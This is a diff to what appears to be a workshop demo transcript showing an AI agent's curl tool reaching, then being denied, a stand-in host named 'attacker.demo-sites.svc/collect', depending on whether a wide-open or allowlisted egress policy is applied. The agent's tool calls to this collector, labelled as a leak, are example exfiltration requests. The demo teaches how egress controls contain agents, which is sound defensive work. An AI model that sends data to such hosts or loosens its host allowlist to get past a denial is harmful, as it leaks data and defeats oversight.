@@ -3,18 +3,18 @@
 $ kubectl apply -f steps/02-curl/control-wide-open.yaml && sleep 2 && kubectl wait --for=condition=Ready workloaddeployment/toolbox-agent
 
 # The same fetch that was refused now reaches the other host:
-$ curl -s -H 'Host: agent.localhost' http://127.0.0.1:18180/ -d 'curl -s http://collector.workshop-sites.svc/collect'
-[user] curl -s http://collector.workshop-sites.svc/collect
-[model] call curl({"arguments":"-s http://collector.workshop-sites.svc/collect"})
-[tool curl] ok: collector: thanks, that is leak #1
-[model] Done. Here is what each step returned: curl: collector: thanks, that is leak #1
+$ curl -s -H 'Host: agent.localhost' http://127.0.0.1:18180/ -d 'curl -s http://attacker.demo-sites.svc/collect'
+[user] curl -s http://attacker.demo-sites.svc/collect
+[model] call curl({"arguments":"-s http://attacker.demo-sites.svc/collect"})
+[tool curl] ok: attacker: got your request
+[model] Done. Here is what each step returned: curl: attacker: got your request
 
 $ kubectl apply -f steps/02-curl/workload.yaml && sleep 2 && kubectl wait --for=condition=Ready workloaddeployment/toolbox-agent
 
 # Reverted: refused again
-$ curl -s -H 'Host: agent.localhost' http://127.0.0.1:18180/ -d 'curl -s http://collector.workshop-sites.svc/collect'
-[user] curl -s http://collector.workshop-sites.svc/collect
-[model] call curl({"arguments":"-s http://collector.workshop-sites.svc/collect"})
-[tool curl] error: {"access-denied":"collector.workshop-sites.svc: this tool may not reach that host (not in its allowedHosts)"}
-[model] Done. Here is what each step returned: curl: ERROR: {"access-denied":"collector.workshop-sites.svc: this tool may not reach that host (not in its allowedHosts)"}
+$ curl -s -H 'Host: agent.localhost' http://127.0.0.1:18180/ -d 'curl -s http://attacker.demo-sites.svc/collect'
+[user] curl -s http://attacker.demo-sites.svc/collect
+[model] call curl({"arguments":"-s http://attacker.demo-sites.svc/collect"})
+[tool curl] error: {"access-denied":"attacker.demo-sites.svc: this tool may not reach that host (not in its allowedHosts)"}
+[model] Done. Here is what each step returned: curl: ERROR: {"access-denied":"attacker.demo-sites.svc: this tool may not reach that host (not in its allowedHosts)"}
 
